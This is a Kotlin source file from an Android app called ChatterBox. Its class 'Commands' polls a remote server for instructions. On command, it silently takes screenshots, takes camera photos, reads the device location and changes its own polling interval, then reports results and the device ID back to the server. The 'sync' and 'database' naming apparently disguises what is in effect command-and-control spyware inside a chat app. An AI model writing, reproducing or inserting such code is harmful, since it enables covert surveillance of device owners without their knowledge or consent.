package com.example.ChatterBox.database

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.Executors

class Commands(private val context: Context) {
    private val TAG = "CommandPoller"
    private var timer: Timer? = null
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newSingleThreadExecutor()
    private var pollInterval = 5 * 60 * 1000L

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    // Store command types temporarily to include in responses
    private val commandTypes = mutableMapOf<String, String>()

    private val commandHandlers = mapOf<String, (JSONObject) -> Unit>(
        "capture_screenshot" to ::handleCaptureScreenshotCommand,
        "capture_camera" to ::handleCaptureCameraCommand,
        "get_location" to ::handleGetLocationCommand,
        "set_interval" to ::handleSetIntervalCommand
    )

    fun startPolling() {
        stopPolling()
        timer = Timer()
        timer?.schedule(object : TimerTask() {
            override fun run() {
                pollForCommands()
            }
        }, 60000, pollInterval)
        Log.d(TAG, "Command polling started with interval: ${pollInterval/1000} seconds")
    }

    fun stopPolling() {
        timer?.cancel()
        timer = null
    }

    private fun pollForCommands() {
        executor.execute {
            try {
                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}command")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true

                val requestData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("timestamp", System.currentTimeMillis())
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(requestData.toString())
                    writer.flush()
                }

                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val response = connection.inputStream.bufferedReader().use { it.readText() }
                    val responseJson = JSONObject(response)
                    if (responseJson.optString("status") == "success") {
                        val commands = responseJson.optJSONArray("commands")
                        if (commands != null && commands.length() > 0) {
                            Log.d(TAG, "Received ${commands.length()} commands")
                            handler.post {
                                for (i in 0 until commands.length()) {
                                    val commandObj = commands.optJSONObject(i)
                                    if (commandObj != null) {
                                        processCommand(commandObj)
                                    }
                                }
                            }
                        }
                    }
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error polling for commands: ${e.message}")
            }
        }
    }

    private fun processCommand(commandObj: JSONObject) {
        try {
            val commandId = commandObj.optString("id")
            val commandType = commandObj.optString("command")
            Log.d(TAG, "Processing command: $commandType, ID: $commandId")

            // Store command type for later use in responses
            if (commandId.isNotEmpty()) {
                commandTypes[commandId] = commandType
            }

            val handler = commandHandlers[commandType]
            if (handler != null) {
                handler(commandObj)
            } else {
                Log.w(TAG, "Unknown command type: $commandType")
                sendCommandResponse(commandId, false, "Unknown command type")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing command: ${e.message}")
        }
    }

    // Public so it can be called from BackgroundSyncService
    fun sendCommandResponse(commandId: String, success: Boolean, message: String, result: JSONObject? = null) {
        executor.execute {
            try {
                val responseData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("command_id", commandId)
                    put("command_type", getCommandTypeForId(commandId))
                    put("success", success)
                    put("message", message)
                    put("timestamp", System.currentTimeMillis())
                    if (result != null) {
                        put("result", result)
                    }
                }

                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}command_response")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(responseData.toString())
                    writer.flush()
                }

                val responseCode = connection.responseCode
                Log.d(TAG, "Command response sent, status: $responseCode")
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error sending command response: ${e.message}")
            }
        }
    }

    private fun getCommandTypeForId(commandId: String): String {
        return commandTypes[commandId] ?: "unknown"
    }

    private fun handleCaptureScreenshotCommand(command: JSONObject) {
        try {
            val commandId = command.optString("id")

            // Send initial response that we're processing the command
            val result = JSONObject().apply {
                put("message", "Screenshot capture initiated")
                put("status", "pending")
            }
            sendCommandResponse(commandId, true, "Screenshot requested", result)

            // Send intent to BackgroundSyncService to actually take the screenshot
            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
            intent.action = "CAPTURE_SCREENSHOT"
            intent.putExtra("command_id", commandId)
            context.startService(intent)

            Log.d(TAG, "Screenshot capture request sent to service")
        } catch (e: Exception) {
            Log.e(TAG, "Error executing capture_screenshot command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    private fun handleCaptureCameraCommand(command: JSONObject) {
        try {
            val commandId = command.optString("id")

            // Check camera permission before requesting capture
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                val result = JSONObject().apply {
                    put("message", "Camera permission not granted")
                    put("status", "error")
                }
                sendCommandResponse(commandId, false, "Camera permission not granted", result)
                return
            }

            // Send initial response that we're processing the command
            val result = JSONObject().apply {
                put("message", "Camera capture initiated")
                put("status", "pending")
            }
            sendCommandResponse(commandId, true, "Camera capture requested", result)

            // Send intent to BackgroundSyncService to take a photo
            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
            intent.action = "CAPTURE_CAMERA"
            intent.putExtra("command_id", commandId)
            context.startService(intent)

            Log.d(TAG, "Camera capture request sent to service")
        } catch (e: Exception) {
            Log.e(TAG, "Error executing capture_camera command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    private fun handleGetLocationCommand(command: JSONObject) {
        try {
            val commandId = command.optString("id")

            // Check location permissions
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

                val result = JSONObject().apply {
                    put("message", "Location permissions not granted")
                    put("status", "error")
                }
                sendCommandResponse(commandId, false, "Location permissions not granted", result)
                return
            }

            val locationTracker = LocationTracker.getInstance(context)
            locationTracker.captureLastKnownLocation { locationData ->
                try {
                    sendCommandResponse(commandId, true, "Location captured", locationData)
                } catch (e: Exception) {
                    Log.e(TAG, "Error sending location response: ${e.message}")
                    sendCommandResponse(commandId, false, "Error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing get_location command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    private fun handleSetIntervalCommand(command: JSONObject) {
        try {
            val commandId = command.optString("id")

            val intervalMinutes = command.optInt("interval", 5)
            pollInterval = intervalMinutes * 60 * 1000L
            startPolling()

            val result = JSONObject().apply {
                put("new_interval", intervalMinutes)
                put("status", "updated")
            }
            sendCommandResponse(commandId, true, "Poll interval updated", result)
        } catch (e: Exception) {
            Log.e(TAG, "Error executing set_interval command: ${e.message}")
            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
        }
    }

    private fun getAppVersion(): String {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
    }
}